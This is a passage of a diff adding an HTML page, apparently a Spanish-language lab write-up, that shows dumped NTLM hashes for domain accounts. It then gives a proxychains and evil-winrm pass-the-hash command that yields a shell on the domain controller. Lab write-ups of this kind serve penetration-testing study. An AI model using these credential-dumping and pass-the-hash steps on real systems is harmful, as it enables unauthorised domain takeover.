+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">p00_adm:1107:aad3b435b51404eeaad3b435b51404ee:a28543372c65db507ce6c266e192594e:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">DC$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">COMPATIBILITY$:1104:aad3b435b51404eeaad3b435b51404ee:bb426464bbe7a8ad0d158c587dcfaf64:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora como el usuario <code class="language-plaintext highlighter-rouge">mr3ks</code> o como cualquier usuario <code class="language-plaintext highlighter-rouge">administrador</code> del dominio como <code class="language-plaintext highlighter-rouge">p00_adm</code> nos podemos conectar por winrm al <code class="language-plaintext highlighter-rouge">DC</code> haciendo un <code class="language-plaintext highlighter-rouge">passthehash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q evil-winrm -i intranet.poo -u mr3ks -H 1f989b7c5df25598ad816e342f69e090  
+PS C:\Users\mr3ks\Documents> </span><span class="am">whoami</span><span class="p">
+poo\mr3ks
+PS C:\Users\mr3ks\Documents> </span><span class="am">hostname</span><span class="p">
+DC
+PS C:\Users\mr3ks\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
